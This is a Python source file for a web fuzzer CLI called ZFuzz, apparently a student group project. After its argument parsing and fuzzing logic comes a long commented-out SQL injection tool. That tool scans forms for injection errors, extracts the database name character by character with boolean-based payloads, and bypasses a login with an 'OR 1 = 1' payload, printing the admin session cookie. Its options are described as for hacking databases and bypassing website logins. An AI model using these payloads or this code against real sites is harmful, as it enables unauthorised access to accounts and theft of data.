import sys
import time
import argparse
from pythonping import ping
import socket
from pwnlib import *
from colored import fg, attr

import requests,sys,re,argparse
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

from .actions import RangeAction
from .actions import UrlAction
from .actions import DictAction
from .actions import ListAction
from .actions import DataAction


class ZFuzzCLI(object):

    def __init__(self):


        self.log = log.getLogger('pwnlib.exploit')
        log.install_default_handler()

        self.bold = attr("bold")
        self.red = fg(203)
        self.green = fg(77)
        self.blue = fg(69)
        self.magenta = fg(170) + self.bold
        self.default = attr("reset")

    def print_banner(self):


        bannerstr = f"""     ___
      |  _|_ _ ___ ___
      |  _| | |- _|- _|
      |_| |___|___|___| {self.default + self.bold}MINI PROJECT GRP-3
                     """
        print(self.magenta + bannerstr + self.default)



    def print_help(self):

        helpstr = f"""{self.bold}Usage: {sys.argv[0]} [OPTIONS] [WORDLIST] [URL]
\nZFuzz Options:{self.default}
    [-h/--help]      -- Print this help message
    [-u/--url]       -- URL to fuzz
    [-w/--wordlist]  -- wordlist
    [-H/--headers]   -- HTTP headers
    [-d/--data]      -- POST data
    [-X/--verb]      -- HTTP verb. Default get
    [-b/--cookies]   -- Cookie to send
    [-k/--keyword]   -- Fuzzing keyword. Default ^FUZZ^
    [-t/--threads]   -- Number of threads. Default 35
    [-s/--delay]     -- Delay between requests
    [-r/--follow]    -- Follow HTTP redirection
    [--quiet]        -- Do not print additional information
    [--timeout]      -- Requests timeout
    [--hc/sc]        -- HTTP Code(s) to hide/show
    [--hs/ss]        -- Response to hide/show that match with the given str
    [--hr/sr]        -- Response to hide/show that match with the given regex
    [--hl/sl]        -- Response lenght to hide/show
    """

        self.print_banner()
        print(helpstr)

    def parse_args(self, argv):



        parser = argparse.ArgumentParser(add_help=False,
                                         description="Python Web Fuzzer")

        parser.add_argument("-t", "--threads",
                            type=int, default=35, action=RangeAction,
                            mini=0, maxi=100)

        parser.add_argument("-w", "--wordlist",
                            type=argparse.FileType('r', errors='ignore'),
                            required=True)

        parser.add_argument("-u", "--url",
                            type=str, action=UrlAction, required=True)

        parser.add_argument("-H", "--headers",
                            type=str, default={}, nargs='*', action=DictAction)

        parser.add_argument("-d", "--data",
                            type=str, default={}, action=DataAction)

        parser.add_argument("-X", "--verb",
                            choices=["GET", "HEAD", "POST", "OPTIONS", "PUT"],
                            type=str, default="get")

        parser.add_argument("-b", "--cookies",
                            type=str, default={}, nargs='*', action=DictAction)

        parser.add_argument("-k", "--keyword",
                            type=str, default="^FUZZ^")

        parser.add_argument("-s", "--delay",
                            type=float, default=0)

        parser.add_argument("-r", "--follow",
                            action="store_true")

        parser.add_argument("--quiet",
                            action="store_true")

        parser.add_argument("--timeout", type=float)

        parser.add_argument("--hc",
                            type=str, default=[], action=ListAction)

        parser.add_argument("--sc",
                            type=str, default=[], action=ListAction)

        parser.add_argument("--hs", type=str)

        parser.add_argument("--ss", type=str)

        parser.add_argument("--hr", type=str)

        parser.add_argument("--sr", type=str)

        parser.add_argument("--hl", type=int)

        parser.add_argument("--sl", type=int)

        return parser.parse_args(argv)

    def main(self, argv):

        from zfuzz.fuzzer import Fuzz

        if len(argv) <= 1 or "--help" in argv or "-h" in argv:
            self.print_help()
            sys.exit(1)

        args = self.parse_args(argv[1:])

        if not args.quiet:
            self.print_banner()
            old_time = time.time()
            self.log.info("Target: {}".format(args.url.replace("^FUZZ^","<fuzz>")))
            print()

        try:
            Fuzz(**vars(args))
        except KeyboardInterrupt:
            sys.exit(1)

        if not args.quiet:
            new_time = time.time()
            print()

            print(f'host name of the machine is {socket.gethostname()}')
            print(f'IP address of the machine is {socket.gethostbyname(socket.gethostname())}')
            ping('google.com',verbose=True)



            self.log.success(f"Scan completed successfully in {int(new_time - old_time)}s")
            print()




# parser = argparse.ArgumentParser()
# parser.add_argument('-d', '--database', type=str, help='hack database with sql injection')
# parser.add_argument('-f', '--forms', type=str, help='bypass login website with sql injection')
# parser.add_argument('-s', '--scan', type=str, help='scan vulnerability the target')
# args = parser.parse_args()
# s = requests.Session()
# s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"

# def get_all_forms(url):
#     soup = bs(s.get(url).content, "html.parser")
#     return soup.find_all("form")


# def get_form_details(form):
#     details = {}
#     try:
#         action = form.attrs.get("action").lower()
#     except:
#         action = None
#     method = form.attrs.get("method", "get").lower()
#     inputs = []
#     for input_tag in form.find_all("input"):
#         input_type = input_tag.attrs.get("type", "text")
#         input_name = input_tag.attrs.get("name")
#         input_value = input_tag.attrs.get("value", "")
#         inputs.append({"type": input_type, "name": input_name, "value": input_value})
#     details["action"] = action
#     details["method"] = method
#     details["inputs"] = inputs
#     return details


# def is_vulnerable(response):
#     errors = {
#         # MySQL
#         "you have an error in your sql syntax;",
#         "warning: mysql",
#         # SQL Server
#         "unclosed quotation mark after the character string",
#         # Oracle
#         "quoted string not properly terminated"
#     }
#     for error in errors:
#         if error in response.content.decode().lower():
#             return True
#     return False

# def scan_sql_injection(url):
#     for c in "\"'":  
#         new_url = f"{url}{c}"
#         print("[!] Trying", new_url)   
#         res = s.get(new_url)
#         if is_vulnerable(res):
           
#             print("[+] SQL Injection vulnerability detected, link:", new_url)
#             return
    
#     forms = get_all_forms(url)
#     print(f"[+] Detected {len(forms)} forms on {url}.")
#     for form in forms:
#         form_details = get_form_details(form)
#         for c in "\"'":    
#             data = {}
#             for input_tag in form_details["inputs"]:
#                 if input_tag["type"] == "hidden" or input_tag["value"]:                 
#                     try:
#                         data[input_tag["name"]] = input_tag["value"] + c
#                     except:
#                         pass
#                 elif input_tag["type"] != "submit":             
#                     data[input_tag["name"]] = f"test{c}"
            
#             url = urljoin(url, form_details["action"])
#             if form_details["method"] == "post":
#                 res = s.post(url, data=data)
#             elif form_details["method"] == "get":
#                 res = s.get(url, params=data)      
#             if is_vulnerable(res):
#                 print("[+] SQL Injection vulnerability detected, link:", url)
#                 print("[+] Form:")
#                 pprint(form_details)
#                 break

#     if args.database:
#         try:
#             url = args.database
#             for i in range(1,25):
#                 for c in range(0x20,0x7f):
#                     payload = "'OR BINARY substring(database(), %d, 1) = '%s' -- " %(i,chr(c))
#                     data = {'username':payload, 'password':'1', 'login':'login'}
#                     res = requests.post(url,data=data)
            
#                     if 'Hallo admin!' in res.text:
#                         sys.stdout.write(chr(c))
#                         sys.stdout.flush()
#                         break
#                     else:
#                         False
#         except:
#             pass
    
#     elif args.forms:
#         try:
#             session_url = requests.session()
#             login_url = args.forms
#             req = session_url.get(login_url)
#             #match = re.search(r'([a-z,0-9]){32}', req.text)
#             payload = """'OR 1 = 1 -- """
#             data = {'username':payload,'password':'1','login':'login'}
#             login = session_url.post(login_url, data=data)
#             cookie = session_url.cookies["PHPSESSID"]
#             if "Hallo admin!" in login.text:
#                 print("-"* 50)
#                 print("[+] Login success!")
#                 print(f"[+] Admin cookie: {cookie}")
#                 print(login.text)
#         except:
#             pass
        
#     elif args.scan:
#         try:
#             url = args.scan
#             scan_sql_injection(url) 
#         except:
#             pass